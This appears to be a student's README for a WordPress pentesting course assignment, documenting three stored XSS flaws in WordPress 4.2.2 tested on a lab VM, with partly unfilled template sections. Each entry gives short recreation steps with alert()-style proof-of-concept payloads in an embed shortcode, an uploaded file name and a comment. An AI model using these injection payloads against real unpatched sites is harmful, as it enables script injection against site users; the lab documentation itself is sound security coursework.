# Project 7 - WordPress Pentesting

Time spent: 10 hours spent in total

> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0-4.7.2(4.2.2)
    - Fixed in version: 4.2.13
  - [ ] GIF Walkthrough: <img src="https://github.com/shengw8/Assignment_7/blob/master/Youtube_embed.gif" width="800">
  - [ ] Steps to recreate: 1. Type the attack command line "[embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]" into a new post or page; 2. Save changes, and then view the page; 3. Alert will show
  - [ ] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
2. Large File Upload Error XSS
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 3.3-4.7.4(4.2.2)
    - Fixed in version: 4.2.15
  - [ ] GIF Walkthrough: <img src="https://github.com/shengw8/Assignment_7/blob/master/Media_Too_Large_XSS.gif" width="800">
  - [ ] Steps to recreate: 1. Change one of the filenames on your local computer to "Dinosaurs secret life<img src=x onerror=alert("alert!!!!")>". 2. Upload this file to a new post or page by adding media. 3. Alert will show
  - [ ] Affected source code:
    - [Link 2](https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6)
3. Authenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: <=4.2.2(4.2.2)
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: <img src="https://github.com/shengw8/Assignment_7/blob/master/Authenticated%20XSS.gif" width="800">
  - [ ] Steps to recreate: 1. Type the attack command line "https://wpdistillery.vm/<svg onload=alert(1)>" on the comments. 2. Save changes and then upload; 3. Alert will show
  - [ ] Affected source code:
    - [Link 3](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough:  <img src="https://github.com/shengw8/Assignment_7/blob/master/Media_Too_Large_XSS.gif" width="800">
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2018] [Shengwei Liu]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
